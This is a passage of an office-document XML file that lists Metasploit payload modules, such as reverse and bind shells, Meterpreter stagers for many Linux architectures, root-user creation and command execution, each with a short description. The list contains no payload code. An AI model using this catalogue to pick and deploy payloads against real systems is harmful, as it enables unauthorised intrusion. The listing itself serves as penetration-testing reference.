      <text:p text:style-name="P1"><text:s text:c="38"/>x64 winhttp)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>firefox/exec <text:s text:c="20"/>This module runs a shell comman</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>d on the target OS without touc</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>hing the disk. On Windows, this</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>command will flash the command</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>prompt momentarily. This can b</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>e avoided by setting WSCRIPT to</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>true, which drops a jscript "l</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>auncher" to disk that hides the</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>prompt.</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>firefox/shell_bind_tcp <text:s text:c="10"/>Creates an interactive shell vi</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>a Javascript with access to Fir</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>efox's XPCOM API</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>firefox/shell_reverse_tcp <text:s text:c="7"/>Creates an interactive shell vi</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>a Javascript with access to Fir</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>efox's XPCOM API</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>generic/custom <text:s text:c="18"/>Use custom string or file as pa</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>yload. Set either PAYLOADFILE o</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>r PAYLOADSTR.</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>generic/debug_trap <text:s text:c="14"/>Generate a debug trap in the ta</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>rget process</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>generic/shell_bind_aws_ssm <text:s text:c="6"/>Creates an interactive shell us</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ing AWS SSM</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>generic/shell_bind_tcp <text:s text:c="10"/>Listen for a connection and spa</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>wn a command shell</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:s text:c="4"/>generic/shell_reverse_tcp <text:s text:c="7"/>Connect back to attacker and sp</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>awn a command shell</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>generic/ssh/interact <text:s text:c="12"/>Interacts with a shell on an es</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>tablished SSH connection</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>generic/tight_loop <text:s text:c="14"/>Generate a tight loop in the ta</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>rget process</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>java/jsp_shell_bind_tcp <text:s text:c="9"/>Listen for a connection and spa</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>wn a command shell</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>java/jsp_shell_reverse_tcp <text:s text:c="6"/>Connect back to attacker and sp</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>awn a command shell</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>java/meterpreter/bind_tcp <text:s text:c="7"/>Run a meterpreter server in Jav</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>a. Listen for a connection</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>java/meterpreter/reverse_http <text:s text:c="3"/>Run a meterpreter server in Jav</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>a. Tunnel communication over HT</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>TP</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>java/meterpreter/reverse_https <text:s text:c="2"/>Run a meterpreter server in Jav</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>a. Tunnel communication over HT</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>TPS</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>java/meterpreter/reverse_tcp <text:s text:c="4"/>Run a meterpreter server in Jav</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>a. Connect back stager</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>java/shell/bind_tcp <text:s text:c="13"/>Spawn a piped command shell (cm</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>d.exe on Windows, /bin/sh every</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>where else). Listen for a conne</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ction</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>java/shell/reverse_tcp <text:s text:c="10"/>Spawn a piped command shell (cm</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>d.exe on Windows, /bin/sh every</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>where else). Connect back stage</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>r</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>java/shell_reverse_tcp <text:s text:c="10"/>Connect back to attacker and sp</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>awn a command shell</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>linux/aarch64/meterpreter/rever <text:s/>Inject the mettle server payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>se_tcp <text:s text:c="26"/>d (staged). Connect back to the</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>linux/aarch64/meterpreter_rever <text:s/>Run the Meterpreter / Mettle se</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>se_http <text:s text:c="25"/>rver payload (stageless)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>linux/aarch64/meterpreter_rever <text:s/>Run the Meterpreter / Mettle se</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>se_https <text:s text:c="24"/>rver payload (stageless)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>linux/aarch64/meterpreter_rever <text:s/>Run the Meterpreter / Mettle se</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>se_tcp <text:s text:c="26"/>rver payload (stageless)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>linux/aarch64/shell/reverse_tcp <text:s/>dup2 socket in x12, then execve</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>. Connect back to the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>linux/aarch64/shell_reverse_tcp <text:s/>Connect back to attacker and sp</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>awn a command shell</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>linux/armbe/meterpreter_reverse <text:s/>Run the Meterpreter / Mettle se</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>_http <text:s text:c="27"/>rver payload (stageless)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>linux/armbe/meterpreter_reverse <text:s/>Run the Meterpreter / Mettle se</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>_https <text:s text:c="26"/>rver payload (stageless)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>linux/armbe/meterpreter_reverse <text:s/>Run the Meterpreter / Mettle se</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>_tcp <text:s text:c="28"/>rver payload (stageless)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>linux/armbe/shell_bind_tcp <text:s text:c="6"/>Listen for a connection and spa</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>wn a command shell</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>linux/armle/adduser <text:s text:c="13"/>Create a new user with UID 0</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:s text:c="4"/>linux/armle/exec <text:s text:c="16"/>Execute an arbitrary command</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>linux/armle/meterpreter/bind_tc <text:s/>Inject the mettle server payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>p <text:s text:c="31"/>d (staged). Listen for a connec</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>tion</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>linux/armle/meterpreter/reverse <text:s/>Inject the mettle server payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>_tcp <text:s text:c="28"/>d (staged). Connect back to the</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>linux/armle/meterpreter_reverse <text:s/>Run the Meterpreter / Mettle se</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>_http <text:s text:c="27"/>rver payload (stageless)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>linux/armle/meterpreter_reverse <text:s/>Run the Meterpreter / Mettle se</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>_https <text:s text:c="26"/>rver payload (stageless)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>linux/armle/meterpreter_reverse <text:s/>Run the Meterpreter / Mettle se</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>_tcp <text:s text:c="28"/>rver payload (stageless)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>linux/armle/shell/bind_tcp <text:s text:c="6"/>dup2 socket in r12, then execve</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>. Listen for a connection</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>linux/armle/shell/reverse_tcp <text:s text:c="3"/>dup2 socket in r12, then execve</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>. Connect back to the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>linux/armle/shell_bind_tcp <text:s text:c="6"/>Connect to target and spawn a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ommand shell</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>linux/armle/shell_reverse_tcp <text:s text:c="3"/>Connect back to attacker and sp</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>awn a command shell</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>linux/mips64/meterpreter_revers <text:s/>Run the Meterpreter / Mettle se</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>e_http <text:s text:c="26"/>rver payload (stageless)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>linux/mips64/meterpreter_revers <text:s/>Run the Meterpreter / Mettle se</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>e_https <text:s text:c="25"/>rver payload (stageless)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>linux/mips64/meterpreter_revers <text:s/>Run the Meterpreter / Mettle se</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>e_tcp <text:s text:c="27"/>rver payload (stageless)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>linux/mipsbe/exec <text:s text:c="15"/>A very small shellcode for exec</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>uting commands. This module is</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>sometimes helpful for testing p</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>urposes.</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>linux/mipsbe/meterpreter/revers <text:s/>Inject the mettle server payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>e_tcp <text:s text:c="27"/>d (staged). Connect back to the</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>linux/mipsbe/meterpreter_revers <text:s/>Run the Meterpreter / Mettle se</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>e_http <text:s text:c="26"/>rver payload (stageless)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>linux/mipsbe/meterpreter_revers <text:s/>Run the Meterpreter / Mettle se</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>e_https <text:s text:c="25"/>rver payload (stageless)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>linux/mipsbe/meterpreter_revers <text:s/>Run the Meterpreter / Mettle se</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>e_tcp <text:s text:c="27"/>rver payload (stageless)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>linux/mipsbe/reboot <text:s text:c="13"/>A very small shellcode for rebo</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>oting the system. This payload</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>is sometimes helpful for testin</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>g purposes or executing other p</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ayloads that rely on initial st</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>artup procedures.</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>linux/mipsbe/shell/reverse_tcp <text:s text:c="2"/>Spawn a command shell (staged).</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>Connect back to the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>linux/mipsbe/shell_bind_tcp <text:s text:c="5"/>Listen for a connection and spa</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>wn a command shell</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>linux/mipsbe/shell_reverse_tcp <text:s text:c="2"/>Connect back to attacker and sp</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>awn a command shell</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:s text:c="4"/>linux/mipsle/exec <text:s text:c="15"/>A very small shellcode for exec</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>uting commands. This module is</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>sometimes helpful for testing p</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>urposes as well as on targets w</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ith extremely limited buffer sp</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ace.</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>linux/mipsle/meterpreter/revers <text:s/>Inject the mettle server payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>e_tcp <text:s text:c="27"/>d (staged). Connect back to the</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>linux/mipsle/meterpreter_revers <text:s/>Run the Meterpreter / Mettle se</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>e_http <text:s text:c="26"/>rver payload (stageless)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>linux/mipsle/meterpreter_revers <text:s/>Run the Meterpreter / Mettle se</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>e_https <text:s text:c="25"/>rver payload (stageless)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>linux/mipsle/meterpreter_revers <text:s/>Run the Meterpreter / Mettle se</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>e_tcp <text:s text:c="27"/>rver payload (stageless)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>linux/mipsle/reboot <text:s text:c="13"/>A very small shellcode for rebo</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>oting the system. This payload</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>is sometimes helpful for testin</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>g purposes.</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>linux/mipsle/shell/reverse_tcp <text:s text:c="2"/>Spawn a command shell (staged).</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>Connect back to the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>linux/mipsle/shell_bind_tcp <text:s text:c="5"/>Listen for a connection and spa</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>wn a command shell</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>linux/mipsle/shell_reverse_tcp <text:s text:c="2"/>Connect back to attacker and sp</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>awn a command shell</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>linux/ppc/meterpreter_reverse_h <text:s/>Run the Meterpreter / Mettle se</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ttp <text:s text:c="29"/>rver payload (stageless)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>linux/ppc/meterpreter_reverse_h <text:s/>Run the Meterpreter / Mettle se</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ttps <text:s text:c="28"/>rver payload (stageless)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>linux/ppc/meterpreter_reverse_t <text:s/>Run the Meterpreter / Mettle se</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cp <text:s text:c="30"/>rver payload (stageless)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>linux/ppc/shell_bind_tcp <text:s text:c="8"/>Listen for a connection and spa</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>wn a command shell</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>linux/ppc/shell_find_port <text:s text:c="7"/>Spawn a shell on an established</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>connection</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>linux/ppc/shell_reverse_tcp <text:s text:c="5"/>Connect back to attacker and sp</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>awn a command shell</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>linux/ppc64/shell_bind_tcp <text:s text:c="6"/>Listen for a connection and spa</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>wn a command shell</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>linux/ppc64/shell_find_port <text:s text:c="5"/>Spawn a shell on an established</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>connection</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>linux/ppc64/shell_reverse_tcp <text:s text:c="3"/>Connect back to attacker and sp</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>awn a command shell</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>linux/ppc64le/meterpreter_rever <text:s/>Run the Meterpreter / Mettle se</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>se_http <text:s text:c="25"/>rver payload (stageless)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>linux/ppc64le/meterpreter_rever <text:s/>Run the Meterpreter / Mettle se</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>se_https <text:s text:c="24"/>rver payload (stageless)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>linux/ppc64le/meterpreter_rever <text:s/>Run the Meterpreter / Mettle se</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>se_tcp <text:s text:c="26"/>rver payload (stageless)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>linux/ppce500v2/meterpreter_rev <text:s/>Run the Meterpreter / Mettle se</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>erse_http <text:s text:c="23"/>rver payload (stageless)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>linux/ppce500v2/meterpreter_rev <text:s/>Run the Meterpreter / Mettle se</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:s text:c="4"/>erse_https <text:s text:c="22"/>rver payload (stageless)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>linux/ppce500v2/meterpreter_rev <text:s/>Run the Meterpreter / Mettle se</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>erse_tcp <text:s text:c="24"/>rver payload (stageless)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>linux/x64/exec <text:s text:c="18"/>Execute an arbitrary command or</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>just a /bin/sh shell</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>linux/x64/meterpreter/bind_tcp <text:s text:c="2"/>Inject the mettle server payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>d (staged). Listen for a connec</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>tion</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>linux/x64/meterpreter/reverse_s <text:s/>Inject the mettle server payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ctp <text:s text:c="29"/>d (staged). Connect back to the</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>linux/x64/meterpreter/reverse_t <text:s/>Inject the mettle server payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cp <text:s text:c="30"/>d (staged). Connect back to the</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>linux/x64/meterpreter_reverse_h <text:s/>Run the Meterpreter / Mettle se</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ttp <text:s text:c="29"/>rver payload (stageless)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>linux/x64/meterpreter_reverse_h <text:s/>Run the Meterpreter / Mettle se</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ttps <text:s text:c="28"/>rver payload (stageless)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>linux/x64/meterpreter_reverse_t <text:s/>Run the Meterpreter / Mettle se</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cp <text:s text:c="30"/>rver payload (stageless)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>linux/x64/pingback_bind_tcp <text:s text:c="5"/>Accept a connection from attack</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>er and report UUID (Linux x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>linux/x64/pingback_reverse_tcp <text:s text:c="2"/>Connect back to attacker and re</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>port UUID (Linux x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>linux/x64/shell/bind_tcp <text:s text:c="8"/>Spawn a command shell (staged).</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>Listen for a connection</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>linux/x64/shell/reverse_sctp <text:s text:c="4"/>Spawn a command shell (staged).</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>Connect back to the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>linux/x64/shell/reverse_tcp <text:s text:c="5"/>Spawn a command shell (staged).</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>Connect back to the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>linux/x64/shell_bind_ipv6_tcp <text:s text:c="3"/>Listen for an IPv6 connection a</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>nd spawn a command shell</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>linux/x64/shell_bind_tcp <text:s text:c="8"/>Listen for a connection and spa</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>wn a command shell</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>linux/x64/shell_bind_tcp_random <text:s/>Listen for a connection in a ra</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>_port <text:s text:c="27"/>ndom port and spawn a command s</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>hell. Use nmap to discover the</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>open port: 'nmap -sS target -p-</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>'.</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>linux/x64/shell_find_port <text:s text:c="7"/>Spawn a shell on an established</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>connection</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>linux/x64/shell_reverse_ipv6_tc <text:s/>Connect back to attacker and sp</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>p <text:s text:c="31"/>awn a command shell over IPv6</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>linux/x64/shell_reverse_tcp <text:s text:c="5"/>Connect back to attacker and sp</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>awn a command shell</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>linux/x86/adduser <text:s text:c="15"/>Create a new user with UID 0</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>linux/x86/chmod <text:s text:c="17"/>Runs chmod on specified file wi</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>th specified mode</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>linux/x86/exec <text:s text:c="18"/>Execute an arbitrary command or</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>just a /bin/sh shell</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>linux/x86/meterpreter/bind_ipv6 <text:s/>Inject the mettle server payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>_tcp <text:s text:c="28"/>d (staged). Listen for an IPv6</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:s text:c="37"/>connection (Linux x86)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>linux/x86/meterpreter/bind_ipv6 <text:s/>Inject the mettle server payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>_tcp_uuid <text:s text:c="23"/>d (staged). Listen for an IPv6</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>connection with UUID Support (L</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>inux x86)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>linux/x86/meterpreter/bind_nonx <text:s/>Inject the mettle server payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>_tcp <text:s text:c="28"/>d (staged). Listen for a connec</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>tion</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>linux/x86/meterpreter/bind_tcp <text:s text:c="2"/>Inject the mettle server payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>d (staged). Listen for a connec</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>tion (Linux x86)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>linux/x86/meterpreter/bind_tcp_ <text:s/>Inject the mettle server payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>uuid <text:s text:c="28"/>d (staged). Listen for a connec</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>tion with UUID Support (Linux x</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>86)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>linux/x86/meterpreter/find_tag <text:s text:c="2"/>Inject the mettle server payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>d (staged). Use an established</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>connection</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>linux/x86/meterpreter/reverse_i <text:s/>Inject the mettle server payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>pv6_tcp <text:s text:c="25"/>d (staged). Connect back to att</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>acker over IPv6</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>linux/x86/meterpreter/reverse_n <text:s/>Inject the mettle server payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>onx_tcp <text:s text:c="25"/>d (staged). Connect back to the</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>linux/x86/meterpreter/reverse_t <text:s/>Inject the mettle server payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cp <text:s text:c="30"/>d (staged). Connect back to the</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>linux/x86/meterpreter/reverse_t <text:s/>Inject the mettle server payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cp_uuid <text:s text:c="25"/>d (staged). Connect back to the</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>linux/x86/meterpreter_reverse_h <text:s/>Run the Meterpreter / Mettle se</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ttp <text:s text:c="29"/>rver payload (stageless)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>linux/x86/meterpreter_reverse_h <text:s/>Run the Meterpreter / Mettle se</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ttps <text:s text:c="28"/>rver payload (stageless)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>linux/x86/meterpreter_reverse_t <text:s/>Run the Meterpreter / Mettle se</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cp <text:s text:c="30"/>rver payload (stageless)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>linux/x86/metsvc_bind_tcp <text:s text:c="7"/>Stub payload for interacting wi</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>th a Meterpreter Service</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>linux/x86/metsvc_reverse_tcp <text:s text:c="4"/>Stub payload for interacting wi</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>th a Meterpreter Service</text:p>
